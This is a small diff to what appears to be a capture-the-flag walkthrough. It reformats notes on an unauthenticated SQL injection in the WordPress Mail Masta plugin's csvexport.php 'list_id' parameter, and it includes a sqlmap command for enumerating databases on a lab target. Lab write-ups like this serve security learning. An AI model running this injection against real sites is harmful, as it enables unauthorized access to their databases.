@@ -285,8 +285,9 @@ ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ```
 * Elyana user is only other user other than root with "/bin/bash" shell access.
 #### Exploit Mail Masta SQLi.
-* Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated).
-* GET Parameter: list_id
+* Page `./wp-content/plugins/mail-masta/inc/lists/csvexport.php` (Unauthenticated).
+* GET parameter:`list_id`.
+
 **Enumerate databases**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
